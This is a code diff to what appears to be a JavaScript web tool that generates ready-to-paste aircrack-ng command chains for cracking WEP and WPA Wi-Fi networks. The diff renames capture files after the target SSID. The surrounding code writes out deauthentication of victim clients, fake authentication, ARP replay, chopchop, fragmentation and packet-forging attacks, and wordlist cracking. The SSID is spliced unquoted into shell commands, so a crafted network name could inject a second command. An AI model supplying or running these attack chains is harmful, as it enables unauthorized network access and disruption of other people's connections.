@@ -207,11 +207,11 @@ function myFunction() {
 		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
 		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble()
 		+ "</table>";
 		
 	document.getElementById("clientlessWEPoutput").innerHTML = 
@@ -219,13 +219,13 @@ function myFunction() {
 		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ '<tr><td colspan="3">' + captureCommand(deviceName, channel, apMac)+ postamble() 
+		+ '<tr><td colspan="3">' + captureCommand(deviceName, channel, apMac, ssid)+ postamble() 
 		+ '<tr><td colspan="3">' + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName)
 		 + copyButton() + "</td><td>" + replayAnyAttack(apMac, mac, deviceName) + postamble()   
 		+ '<tr><td colspan="2">' + packetForge(apMac, mac, deviceName) + postamble() 
 		+ '<tr><td colspan="2">' + replayAttack(deviceName) + postamble()               
-		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble()
 		+ "</table>";
 		
 	document.getElementById("wepViaClientOutput").innerHTML = 
@@ -233,10 +233,10 @@ function myFunction() {
 		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
 		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + packetReplayAttack(apMac, deviceName) + postamble()
-		+ preamble() + sudo() + "aircrack-ng -z `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng -z `ls -t "+ssid+"*.cap | head -1`" + postamble();
 		+ "</table>";
 		
 	document.getElementById("sharedKeyWEPoutput").innerHTML = 
@@ -244,12 +244,12 @@ function myFunction() {
 		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
 		+ preamble() + fakeAuthSK(ssid, apMac, mac, deviceName) + postamble() 
 		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble() 
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble();
 		+ "</table>";
 		
 	document.getElementById("wpaOutput").innerHTML = 
@@ -257,9 +257,9 @@ function myFunction() {
 		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac, ssid) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + sudo() + "aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t "+ssid+"*.cap | head -1`" + postamble();
 		+ "</table>";
 }
 
@@ -291,8 +291,8 @@ function setup() {
 	return sudo() + "airmon-ng check kill; " + sudo() + "airmon-ng check kill";
 }
 
-function captureCommand(device, channel, ssid) {
-	return sudo() + `airodump-ng ${device} -c ${channel} --bssid ${ssid} -w cap1`
+function captureCommand(device, channel, ssid, netName) {
+	return sudo() + `airodump-ng ${device} -c ${channel} --bssid ${ssid} -w ${netName}`
 }
 
 function monitorMode(device, channel) {
